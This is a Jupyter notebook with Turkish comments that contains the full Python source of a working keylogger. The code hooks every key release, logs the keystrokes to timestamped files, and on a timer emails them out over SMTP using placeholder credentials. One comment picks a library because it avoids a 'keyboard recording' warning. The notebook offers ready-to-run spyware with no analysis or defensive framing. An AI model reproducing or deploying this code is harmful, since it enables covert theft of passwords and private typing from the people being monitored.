{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import keyboard #pynput kullanilabilir fakat \"keyboard recording\" uyarisi verir!\n",
    "import smtplib\n",
    "from threading import Timer\n",
    "from datetime import datetime\n",
    "import sifre\n",
    "\n",
    "MAIL_USER = \"MAIL ADDRESSINIZI GIRIN\" \n",
    "MAIL_SIFRE = \"MAIL SIFRENIZI GIRIN\" \n",
    "MAIL_SMTP = \"smtp.ethereal.email\" #Ethereal Örnegidir\n",
    "SMTP_PORT = 587 # Ethereal Portudur\n",
    "RAPOR_SURE = 60 # loglarin mail ile atilma süresini düzenler\n",
    "RAPOR_TIPI = \"mail\" # \"mail\" veya sadece kayit icin \"dosya\" tercih edilebilir!\n",
    "\n",
    "class Keylogger:\n",
    "    def __init__(self, sure, rapor):\n",
    "        self.sure = sure\n",
    "        self.rapor = rapor\n",
    "        self.log = \"\"\n",
    "        self.baslangic = datetime.strftime(datetime.today() , '%d-%m-%Y-%Hh-%Mm')\n",
    "        self.bitis = datetime.strftime(datetime.today() , '%d-%m-%Y-%Hh-%Mm')\n",
    "\n",
    "\n",
    "    def tus_yakalama(self, event):\n",
    "        name = event.name\n",
    "        if len(name) > 1:\n",
    "            if name == \"space\":\n",
    "                name = \" \"\n",
    "            elif name == \"enter\":\n",
    "                name = \"[ENTER]\"\n",
    "            elif name == \"tab\":\n",
    "                name = \"[TAB]\"\n",
    "            elif name == \"ctrl\":\n",
    "                name = \"[CTRL]\"\n",
    "            elif name == \"alt\":\n",
    "                name = \"[ALT]\"\n",
    "            elif name == \"backspace\":\n",
    "                name = \"[SIL]\"\n",
    "            elif name == \"shift\":\n",
    "                name = \"[^]\"\n",
    "            elif name == \"!\":\n",
    "                name = \"[!]\"\n",
    "            elif name == \"down\":\n",
    "                name = \"[ALT_TUS]\"\n",
    "            elif name == \"right\":\n",
    "                name = \"[SAG_TUS]\"\n",
    "            elif name == \"left\":\n",
    "                name = \"[SOL_TUS]\"\n",
    "            elif name == \"up\":\n",
    "                name = \"[ÜST_TUS]\"\n",
    "        #elif name == \" \":\n",
    "            #name = \"[BOSLUK]\"  # BOSLUK YERINE [BOSLUK] YAZMASINI SAGLAR\n",
    "        self.log += name\n",
    "\n",
    "\n",
    "    def dosya_isimlendir(self):\n",
    "        baslama_zamani = str(self.baslangic)\n",
    "        bitis_zamani = str(self.bitis)\n",
    "        self.dosya_adi = f\"log{baslama_zamani}_{bitis_zamani}\"\n",
    "\n",
    "    def dosya_olustur(self):\n",
    "        with open(f\"{self.dosya_adi}.txt\", \"w+\") as d:\n",
    "            print(self.log, file=d)\n",
    "        print(f\"[+] Yeni girdi: {self.dosya_adi}.txt\") # Terminalden cikti verir\n",
    "\n",
    "    def mail_gonderme(self, icerik, mail=MAIL_USER, sifre=MAIL_SIFRE):\n",
    "        server = smtplib.SMTP(host=MAIL_SMTP, port=SMTP_PORT)\n",
    "        #TLS modunda sifreleme icin :\n",
    "        server.starttls()\n",
    "        server.login(mail, sifre)\n",
    "        server.sendmail(mail,mail,icerik.encode('utf-8'))\n",
    "        server.quit()\n",
    "\n",
    "    def icerik(self):\n",
    "        if self.log:\n",
    "            self.dosya_isimlendir()\n",
    "            self.dosya_olustur()\n",
    "            if self.rapor == \"mail\":\n",
    "                self.mail_gonderme(self.log, MAIL_USER,MAIL_SIFRE)\n",
    "            elif self.rapor == \"dosya\":\n",
    "                self.dosya_olustur() #yönlendirme eklenebilir\n",
    "            print(f\"[{self.dosya_adi} icine yazdirildi: {self.log}\") # Terminalde yazdirilan loglari görme\n",
    "            self.baslangic = datetime.strftime(datetime.today() , '%d-%m-%Y-%Hh-%Mm')\n",
    "\n",
    "        zamanlayici = Timer(interval=RAPOR_SURE, function=self.icerik) # Multithread yapmasi icin zamanlayici döngü\n",
    "        zamanlayici.daemon = True\n",
    "        zamanlayici.start()\n",
    "        self.log = \"\"\n",
    "\n",
    "    def baslat(self):\n",
    "        self.baslangic = datetime.strftime(datetime.today() , '%d-%m-%Y-%Hh-%Mm')\n",
    "        keyboard.on_release(callback=self.tus_yakalama)\n",
    "        self.icerik()\n",
    "        keyboard.wait()\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    logger = Keylogger(sure=RAPOR_SURE, rapor=RAPOR_TIPI)\n",
    "    logger.baslat()"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
